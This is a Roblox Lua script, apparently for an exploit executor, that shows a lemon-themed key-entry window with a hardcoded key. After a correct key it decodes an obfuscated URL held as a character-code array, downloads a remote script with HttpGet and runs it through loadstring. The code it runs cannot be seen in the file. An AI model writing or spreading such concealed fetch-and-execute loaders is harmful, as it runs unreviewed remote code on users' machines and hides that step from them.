-- Key system with clown style GUI and success message

local keyData = {76, 101, 109, 111, 110} -- "Lemon"
local function decodeKey(tbl)
    local result = ""
    for _, v in ipairs(tbl) do
        result = result .. string.char(v)
    end
    return result
end
local validKey = decodeKey(keyData)

local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "ClownKeySystem"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 350, 0, 180)
frame.Position = UDim2.new(0.5, -175, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(255, 223, 0) -- яркий лимонный желтый
frame.BorderSizePixel = 4
frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255, 69, 0)
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.Bangers
title.TextSize = 30
title.Text = "🍋 Enter your key 🍋"

local box = Instance.new("TextBox", frame)
box.PlaceholderText = "Type your key here"
box.Size = UDim2.new(0.85, 0, 0, 40)
box.Position = UDim2.new(0.075, 0, 0, 50)
box.BackgroundColor3 = Color3.fromRGB(255, 255, 153)
box.TextColor3 = Color3.fromRGB(0, 0, 0)
box.Font = Enum.Font.GothamBold
box.TextSize = 24
box.ClearTextOnFocus = false
box.Text = ""

local button = Instance.new("TextButton", frame)
button.Text = "Submit"
button.Size = UDim2.new(0.85, 0, 0, 40)
button.Position = UDim2.new(0.075, 0, 0, 100)
button.BackgroundColor3 = Color3.fromRGB(255, 69, 0)
button.TextColor3 = Color3.new(1,1,1)
button.Font = Enum.Font.Bangers
button.TextSize = 28
button.AutoButtonColor = true

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 30)
feedback.Position = UDim2.new(0, 0, 0, 150)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.Font = Enum.Font.GothamBold
feedback.TextSize = 24
feedback.TextColor3 = Color3.new(1, 0, 0) -- красный для ошибки

local encryptedURL = {
    104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,
    47,102,105,108,101,115,47,118,51,47,108,111,97,100,101,114,115,47,
    102,102,100,102,101,97,100,102,48,97,102,55,57,56,55,52,49,56,48,54,101,97,
    52,48,52,54,56,50,97,57,51,56,46,108,117,97
}

local function decodeURL(tbl)
    local s = ""
    for _, v in ipairs(tbl) do
        s = s .. string.char(v)
    end
    return s
end

button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$") -- trim spaces

    if input == validKey then
        feedback.TextColor3 = Color3.fromRGB(0, 170, 0) -- зеленый
        feedback.Text = "Success! Key accepted."
        wait(1)
        gui:Destroy()

        local url = decodeURL(encryptedURL)
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)

        if success then
            local func, err = loadstring(result)
            if func then
                func()
            else
                warn("Script compile error:", err)
            end
        else
            warn("Failed to load script:", result)
        end
    else
        feedback.TextColor3 = Color3.fromRGB(255, 0, 0) -- красный
        feedback.Text = "Invalid Key"
        wait(2)
        feedback.Text = ""
    end
end)
